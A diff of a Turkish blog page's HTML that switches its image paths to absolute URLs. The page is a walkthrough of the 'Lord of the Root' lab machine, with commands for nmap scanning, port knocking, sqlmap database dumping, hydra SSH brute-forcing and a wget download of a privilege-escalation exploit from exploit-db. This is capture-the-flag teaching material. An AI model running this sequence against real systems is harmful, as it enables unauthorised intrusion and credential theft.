@@ -62,7 +62,7 @@
     <!-- Page Header -->
     <!-- Set your background image for this header on the line below. -->
     <div style="margin-bottom: 3%;"></div>
-    <header class="intro-header" style="background-image: url('img/lotr/LOTR.png'); height: 530px;">
+    <header class="intro-header" style="background-image: url('http://huseyinkavuncu.com/img/lotr/LOTR.png'); height: 530px;">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
@@ -85,13 +85,13 @@
 
                     <p>Merhabalar. Bu yazımda sizlerle Lord of the Root makinesini çözmeye çalışacağız. Lord of the Rings serisini okuyan ve filmlerini hayranlıkla izleyen birisi olarak bu makine çözümü oldukça heyecan vericiydi.</p>
 
-                    <img src="img/lotr/160431.jpg" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/160431.jpg" class="img-responsive" alt="">
 
                     <p>Bu güzel yapıta ait bir fotoğraf koymasam olmazdı. En temel karakterleri Legolas, Aragorn, Gimli, Gandalf ve Frodo olan bu yapıtta filmden birkaç ipucu olması lazım. Tabii ki bu benim görüşüm bakalım ne ile karşılaşacağız. </p>
 
                     <p>O zaman yavaş yavaş başlayalım. Her zaman ki gibi hedef makineyi tespit ederek başlayalım.</p>
 
-                    <img src="img/lotr/1.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/1.png" class="img-responsive" alt="">
 <br>
                     <p style="display: inline;"><code style="display: inline;">netdiscover </code> komutu ile;</p>
 
@@ -101,25 +101,25 @@
 
                     <p>Kendi IP adresimizi öğreniyoruz. Herhangi bir payload kullanacağımız zaman lazım olabilir. Ne kadar çok şey bilirsek sisteme/makineye sızmamız o kadar kolay olacaktır.</p>
 
-                    <img src="img/lotr/2.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/2.png" class="img-responsive" alt="">
 <br>
                     <p style="display: inline;"><code style="display: inline;">nmap -A 192.168.43.215 </code> komutu ile;</p>
 
                     <p>Agresif bir tarama yaptık. Zafiyetli bir makine olduğunu bildiğimiz için rahatça -A parametresini kullandık. Peki ne ile karşılaştık SSH portu açık. Hedef makine de Linux işletim sistemi çalışıyor. Elimizde sadece bir port var. Pek bir alternatifimiz yok yani. </p>
 
-                    <img src="img/lotr/3.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/3.png" class="img-responsive" alt="">
 
                     <p>Evet bir ipucu bulduk işte. Güzel bir LOTR yazısının arkasında Knock Friend To Enter yazıyor. Yani girmek için arkadaşına çal/zilini çal/kapısını çal yazıyor. Sol altta da Easy as 1,2,3 yani 1,2,3 gibi kolay yazıyor. Belirli bir senaryo var biz onu izleyeceğiz galiba. Burada bizden port knocking işlemi yapmamızı istiyor.</p>
     
                     <p>Port knocking nedir? Aslında faal olan servislerin kapalı gibi gösterilmesi için kullanılan bir yöntemdir. Biz bu portlara(1,2,3) knock işlemi yaptığımızda aslında faal olan ama bizim nmap taramamızda göremediğimiz bir servis tekrar faal duruma gelecek. </p>
 
-                    <img src="img/lotr/11.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/11.png" class="img-responsive" alt="">
 <br>
                     <p style="display: inline;"><code style="display: inline;">apt-get install knockd</code> komutu ile;</p>
 
                     <p>Knock işlemini yapmam için kullanacağımız tool olan knockd’ı indiriyoruz.</p>
                     
-                    <img src="img/lotr/12.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/12.png" class="img-responsive" alt="">
 <br>
                     <p style="display: inline;"><code style="display: inline;">knock 192.168.43.215 1 2 3</code> komutu ile;</p>
 
@@ -131,23 +131,23 @@
 
                     <p>Parametreleri incelediğimize göre farklılıklara bakabiliriz artık. SSH portu açık, bir de 1337 http servisi açık. Hemen kontrol edelim.</p>
 
-                    <img src="img/lotr/13.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/13.png" class="img-responsive" alt="">
 <br>
                     <code style="display: inline;">192.168.43.215:1337 </code>
 
                     <p>Adresine gidiyoruz. Allah affetsin, bu kız kardeşimiz biraz sinirli galiba. “I will do it. I will take the ring into Mordor.” Diyor. Yani “Yapacağım. Yüzüğü Mordor’a götüreceğim.” Anlamına geliyor. Burada Mordor bir ipucu bence. Yani öyle olmalı source code’una baktım pek bir şey çıkaramadım açıkçası.</p>
 
-                    <img src="img/lotr/15.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/15.png" class="img-responsive" alt="">
 <br>
                     <code style="display: inline;">192.168.43.215:1337/mordor</code>
                     
                     <p>Adresine geldik ve bizi Frodo ve yoldaşı Sam karşılıyor. Filmden bir replik. “Sam, we can’t go this way. The black gate is too mainstream.” Burada bay Frodo “Sam bu yoldan da gidemeyiz. Siyah kapıda ana akım.” gibi bir şey diyor. Filmde burada Black Gate’e geliyor bu iki yoldaş ve Sauron’un ordusunun akına çıktığını ve bu kapıyı kullanan binlerce ork askeri olduğunu görüyor ve yönlerini değiştiriyor. Sanırım bizimde yön değiştirmemiz gerekiyor. Source code’a bakıyoruz.</p>
 
-                    <img src="img/lotr/16.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/16.png" class="img-responsive" alt="">
 
                     <p>Evet burada bir ipucu daha bulduk. Hemen bu metni kopyalayıp alıyoruz.</p>
 
-                    <img src="img/lotr/17.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/17.png" class="img-responsive" alt="">
 <br>
                     <code>echo “THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh”|based64 –decode</code>
 
@@ -157,37 +157,37 @@
 
                     <p>Komutu ile tekrar decode ettiğimizde evet sonuca ulaştık. Bize bir php uzantısı verdi. Hemen bunu da deniyoruz. </p>
 
-                    <img src="img/lotr/18.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/18.png" class="img-responsive" alt="">
 <br>
                     <code>192.168.43.215:1337/978345210/index.php</code>
 
                     <p>Adresine girdiğimizde bir login sayfası ile karşılaşıyoruz. </p>
 
-                    <img src="img/lotr/34.jpg" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/34.jpg" class="img-responsive" alt="">
 <br>
                     <code style="display: inline;">sqlmap -o -u http:// 192.168.43.215:1337/978345210/index.php --forms --dbs</code>
 
                     <p>Bu komutu kullanarak sqlmap tool’u yardımı ile bu form arkasında kullanılan sql database’ini tespit ediyoruz. Dört farklı database tespit edildi. Webapp database’ini kontrol edelim.</p>
 
-                    <img src="img/lotr/31.jpg" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/31.jpg" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp --tables</code><p style="display: inline;"> komutu ile;</p>
 
                     <p>Webapp database’inde yer alan tabloları kontrol ediyoruz. Users diye bir tablo var. Aradığımız şey bu olsa gerek.</p>
 
-                    <img src="img/lotr/32.jpg" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/32.jpg" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp -T Users --columns </code><p style="display: inline;"> komutu ile;</p>
 
                     <p>Webapp database’inde bulunan Users tablosunun sütunlarını(columns) taradık. Üç adet sütun bulunmaktadır. id, password, username ve bunların tip bilgileride geldi. </p>
                     
-                    <img src="img/lotr/33.jpg" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/33.jpg" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp -T Users -C id,username,password --dump </code><p style="display: inline;"> komutu ile;</p>
 
                     <p>Webapp database’inin Users tablosunun id, username ve password sütunlarını tarıyoruz. 5 kullanıcıya ait kullanıcı adı ve şifreye ulaşmış olduk.</p>
 
-                    <img src="img/lotr/37.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/37.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">192.168.43.215:1337/978345210/index.php</code>
 
@@ -195,23 +195,23 @@
 
                     <p>Burada elimizde beş kullanıcı ve bunların profile.php için kullandıkları 5 adet parola var. Bu kullanıcılar SSH bağlantısı için acaba aynı parolayı mı kullanıyorlar?</p>
 
-                    <img src="img/lotr/38.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/38.png" class="img-responsive" alt="">
 <hr>
                     <p>Burada sqlmap in verdiği csv dosyasını açtım ve kendime bir adet usr.txt ve bir adet de pass.txt oluşturdum. Bu şifreler ile BruteForce atacağız. Olmazsa bir passlist.txt deneyeceğiz.</p>
 
-                    <img src="img/lotr/39.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/39.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">hydra -L /root/Desktop/lotr/usr -P /root/Desktop/lotr/pass ssh://192.168.43.215 </code><p style="display: inline;"> komutu ile;</p>
 
                     <p>Hydra aracını kullanarak BruteForce atıyoruz. Burada kendi oluşturduğum dosyaların dizinlerini verdim ssh ile hangi IP adresine saldırı yapılacağını belirledim. Bizim gollum arkadaşımız Smeagol SSH bağlantısı yapabiliyor ve şifresi de database’de tespit ettiğimiz şifre ile aynı.</p>
 
-                    <img src="img/lotr/40.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/40.png" class="img-responsive" alt="">
 <hr>
                     <code>ssh smeagol@192.168.43.215</code>
 
                     <p>Teşekkürler gollum kardeş. Sanırım artık makine içerisine girmiş bulunmaktayız.</p>
 
-                    <img src="img/lotr/41.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/41.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">ls</code><p style="display: inline;"> komutu ile;</p>
 
@@ -221,7 +221,7 @@
 
                     <p>Maalesef yetki yükseltmek için kullanabileceğim bir uygulama göremedim. Eğer siz gördüyseniz bana bunu bildirebilirsiniz. Benim dikkatimi sadece SECRET klasörü ve içerisinde bulunan door1, door2 ve door3 klasörleri çekti.</p>
 
-                    <img src="img/lotr/42.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/42.png" class="img-responsive" alt="">
 
                     <p>Dosyaların içerisinde birer file dosyası var. </p>
 
@@ -233,7 +233,7 @@
 
                     <p>Burada byte cinsinden boyutlarını elde ettik ve door1 klasöründe bulunan file dosyası diğer iki dosyadan farklı. </p>
 
-                    <img src="img/lotr/43.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/43.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">cp door1/file /home/smeagol/buffer </code><p style="display: inline;"> komutu ile;</p>
 
@@ -251,23 +251,23 @@
 
                     <p>Bu işlem uzayacak gibi derken aklıma bir fikir daha geldi. İşletim sistemimiz Linux. Belki bunu kullanabiliriz</p>
 
-                    <img src="img/lotr/51.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/51.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">uname –all</code><p style="display: inline;"> komutu ile;</p>
 
                     <p>İşletim sistemi hakkında biraz daha fazla bilgi ediniyoruz. Ubuntu 14.</p>
 
-                    <img src="img/lotr/50.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/50.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">searchsploit ubuntu 14</code><p style="display: inline;"> komutu ile;</p>
 
                     <p>Buradan uygun exploit’i seçiyoruz. Burada “Local Privilege Escalation” dikkatimizi çekiyor. “Yerel Ayrıcalık Yükselmesi” anlamına geliyor. Bunu kullanabiliriz bence.</p>
 
-                    <img src="img/lotr/52.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/52.png" class="img-responsive" alt="">
 
                     <p>39166 exploit numarısını exploit-db.com üzerinden aratıyoruz ve download adres uzantısını alıyoruz.</p>
 
-                    <img src="img/lotr/53.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/53.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">wget https://www.exploit-db.com/download/39166</code><p style="display: inline;"> komutu ile;</p>
 
@@ -277,7 +277,7 @@
 
                     <p>Dosyaları kontrol ediyoruz ve göründüğü üzere başarılı bir şekilde dosyamız hazır ve nazır beklemekte.</p>
 
-                    <img src="img/lotr/54.png" class="img-responsive" alt="">
+                    <img src="http://huseyinkavuncu.com/img/lotr/54.png" class="img-responsive" alt="">
 <hr>
                     <code style="display: inline;">file 39166</code><p style="display: inline;"> komutu ile;</p>
                     
